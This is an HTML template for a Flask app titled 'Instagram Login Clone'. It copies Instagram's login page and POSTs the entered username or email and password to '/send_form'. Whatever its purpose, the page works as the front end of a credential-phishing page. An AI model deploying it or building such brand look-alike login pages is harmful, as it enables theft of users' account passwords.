<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>
   Instagram Login Clone
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
            font-family: 'Roboto', sans-serif;
        }
  </style>
 </head>
 <body class="bg-gray-50 flex items-center justify-center min-h-screen">
  <div class="w-full max-w-sm bg-white p-8 border border-gray-300 rounded-md">
   <div class="flex justify-center mb-6">
    <img alt="Instagram logo placeholder" class="h-12" height="60" src="{{ url_for('static', filename='images/logo.png') }}" width="200"/>

   </div>
   <form class="space-y-4" action="/send_form" method="POST">
    <div>
     <input name="email" id="email" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Phone number, username, or email" type="text"/>
    </div>
    <div>
     <input name="password" id="password" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Password" type="password"/>
    </div>
    <div>
     <button class="w-full bg-blue-500 text-white py-2 rounded-md font-semibold hover:bg-blue-600" type="submit">
      Log In
     </button>
    </div>
    <div class="flex items-center justify-between">
     <hr class="w-full border-gray-300"/>
     <span class="px-2 text-gray-500">
      OR
     </span>
     <hr class="w-full border-gray-300"/>
    </div>
    <div class="flex justify-center">
     <a class="text-blue-500 font-semibold" href="#">
      <i class="fab fa-facebook-square mr-2">
      </i>
      Log in with Facebook
     </a>
    </div>
    <div class="flex justify-center">
     <a class="text-blue-500 text-sm" href="#">
      Forgot password?
     </a>
    </div>
   </form>
  </div>
 </body>
</html>
